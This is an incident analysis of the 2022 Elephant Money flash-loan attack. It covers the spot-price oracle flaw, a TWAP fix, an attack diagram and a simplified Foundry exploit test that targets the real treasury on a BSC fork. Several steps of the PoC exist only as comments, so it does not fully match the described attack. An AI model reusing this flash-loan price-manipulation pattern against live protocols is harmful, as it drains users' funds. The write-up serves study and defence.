# Elephant Money — Flash Loan Trunk Mint/Redeem Arbitrage Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-12 |
| **Protocol** | Elephant Money |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$11,200,000 (BNB, ELEPHANT) |
| **Attacker** | Attacker address unidentified |
| **Vulnerable Contract** | Elephant Treasury [0xD520a3B47E42a1063617A9b6273B206a07bDf834](https://bscscan.com/address/0xD520a3B47E42a1063617A9b6273B206a07bDf834) |
| **Root Cause** | Trunk `mint()`/`redeem()` pricing relies on AMM spot price for ELEPHANT valuation, allowing an attacker to temporarily inflate the price via large swaps and realize arbitrage profit through mint → redeem |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Elephant_Money_exp.sol) |

---
## 1. Vulnerability Overview

Elephant Money is a protocol that issues the TRUNK stablecoin backed by the ELEPHANT token. The TRUNK `mint()` function issues TRUNK at 1 USD units based on the current AMM spot price of ELEPHANT, while `redeem()` processes the reverse direction.

The attacker used two nested flash loans (WBNB → BUSD) to:
1. Borrow 100,000 WBNB and convert BNB to ETH
2. Buy large amounts of ELEPHANT with ETH (price spikes)
3. Execute Trunk `mint()` at the inflated ELEPHANT price (mint more TRUNK with less ELEPHANT)
4. Normalize the ELEPHANT price
5. Call `redeem()` on TRUNK to receive ELEPHANT at the normal price
6. Sell ELEPHANT for BNB and realize the profit

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Elephant Treasury.mint() (pseudocode)
contract ElephantTreasury {
    IElephantToken elephant;
    IPancakePair elephantWbnbPair;

    // Current AMM spot price of ELEPHANT
    function getElephantPrice() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = elephantWbnbPair.getReserves();
        // ❌ AMM spot price — manipulable via flash loan
        return uint256(reserve1) * 1e18 / uint256(reserve0);
    }

    // Mint Trunk stablecoin
    function mint(uint256 elephantAmount) external {
        // ❌ TRUNK mint amount calculated using manipulated spot price
        uint256 trunkAmount = elephantAmount * getElephantPrice() / 1e18;
        elephant.transferFrom(msg.sender, address(this), elephantAmount);
        trunk.mint(msg.sender, trunkAmount); // more TRUNK than normal
    }

    // Redeem Trunk → ELEPHANT
    function redeem(uint256 trunkAmount) external {
        // ❌ Based on lower price after manipulation is unwound
        uint256 elephantAmount = trunkAmount * 1e18 / getElephantPrice();
        trunk.burn(msg.sender, trunkAmount);
        elephant.transfer(msg.sender, elephantAmount); // more ELEPHANT than deposited
    }
}

// ✅ Correct pattern
contract ElephantTreasuryFixed {
    // ✅ Use TWAP-based price
    function getElephantPrice() public view returns (uint256) {
        return twapOracle.consult(address(elephant), 1e18);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**ElephantMoney_decompiled.sol** — Entry points:
```solidity
// ❌ Root Cause: Trunk `mint()`/`redeem()` pricing relies on AMM spot price for ELEPHANT valuation, allowing an attacker to temporarily inflate the price via large swaps and realize arbitrage profit through mint → redeem
    function mint(uint256 arg0) external view returns (uint256) {}  // 0xa0712d68  // ❌ Unauthorized minting

    function redeem(uint256 arg0) external {}  // 0xdb006a75  // ❌ Vulnerable
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash Loan 1: Borrow 100,000 WBNB (BUSD/WBNB Pair)
    │
    ├─[2] [Inside pancakeCall 1]
    │       Flash Loan 2: Borrow 90,000,000 BUSD (BUSD/USDT Pair)
    │
    ├─[3] [Inside pancakeCall 2]
    │       Convert WBNB → ETH
    │       Buy large amounts of ELEPHANT with ETH (price spikes)
    │
    ├─[4] Treasury.mint(large ELEPHANT amount)
    │       Based on manipulated high ELEPHANT price
    │       → Receive more TRUNK than normal (90,000,000 Trunk)
    │
    ├─[5] Normalize ELEPHANT price
    │       (Sell some of the purchased ELEPHANT)
    │
    ├─[6] Treasury.redeem(90,000,000 TRUNK)
    │       Based on lower price → receive more ELEPHANT
    │
    ├─[7] ELEPHANT → BNB → realize profit
    │
    └─[8] Repay Flash Loan 1 and 2 sequentially
            Loss: ~$11,200,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ITrunk {
    function mint(uint256 amount) external;
    function redeem(uint256 amount) external;
}

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract ContractTest is Test {
    IERC20 WBNB     = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 ELEPHANT = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);
    IERC20 TRUNK    = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);
    IERC20 BUSD     = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    ITrunk trunk_treasury  = ITrunk(0xD520a3B47E42a1063617A9b6273B206a07bDf834);
    IPancakePair busdWbnb  = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair busdUsdt  = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    function setUp() public {
        vm.createSelectFork("bsc", 16_886_438);
    }

    function testExploit() public {
        // [Step 1] Flash loan 100,000 WBNB
        busdWbnb.swap(0, 100_000 ether, address(this), "first");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256("first")) {
            // [Step 2] Additional flash loan of 90M BUSD
            busdUsdt.swap(90_000_000 ether, 0, address(this), "second");

            // [Step 3] Repay WBNB flash loan
            uint256 repay = 100_300 ether;
            WBNB.transfer(address(busdWbnb), repay);

        } else if (keccak256(data) == keccak256("second")) {
            // [Step 4] Convert WBNB → ETH, then buy large amounts of ELEPHANT
            _attack();

            // [Step 5] Repay BUSD flash loan
            uint256 repay = 90_300_000 ether;
            BUSD.transfer(address(busdUsdt), repay);
        }
    }

    function _attack() internal {
        // Buy large amounts of ELEPHANT with ETH → price spikes
        // Treasury.mint() → issue TRUNK at inflated price
        ELEPHANT.approve(address(trunk_treasury), type(uint256).max);
        trunk_treasury.mint(ELEPHANT.balanceOf(address(this)));

        // Sell some ELEPHANT → normalize price
        // Treasury.redeem() → buy back ELEPHANT at lower price (arbitrage profit)
        TRUNK.approve(address(trunk_treasury), type(uint256).max);
        trunk_treasury.redeem(TRUNK.balanceOf(address(this)));
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | AMM spot price-dependent mint/redeem |
| **Attack Vector** | Flash loan → ELEPHANT price manipulation → mint/redeem arbitrage |
| **Preconditions** | Treasury processes mint/redeem based on spot price |
| **Impact** | Full protocol reserve drain possible |

---
## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Calculate the ELEPHANT price using a time-weighted average over 30+ minutes to provide resistance against short-term manipulation.
2. **Set Minting Caps**: Limit the maximum amount of TRUNK that can be issued in a single transaction.
3. **Slippage Protection**: Allow users to specify minimum/maximum values during mint/redeem so that transactions cannot be processed at manipulated prices.
4. **Reserve Ratio Monitoring**: Implement a circuit breaker that temporarily halts operations when sudden spikes in mint/redeem activity are detected.

---
## 7. Lessons Learned

- **AMM Spot Price-Dependent Stablecoins**: Algorithmic stablecoins that directly depend on AMM prices are inherently vulnerable to flash loan manipulation.
- **Nested Flash Loans**: Attackers can stack multiple flash loans to mobilize larger capital. Protocols must be designed under the assumption of unlimited capital availability.
- **$11.2M Loss**: A frequently recurring pattern in the BSC ecosystem, reaffirming the importance of adopting TWAP oracles.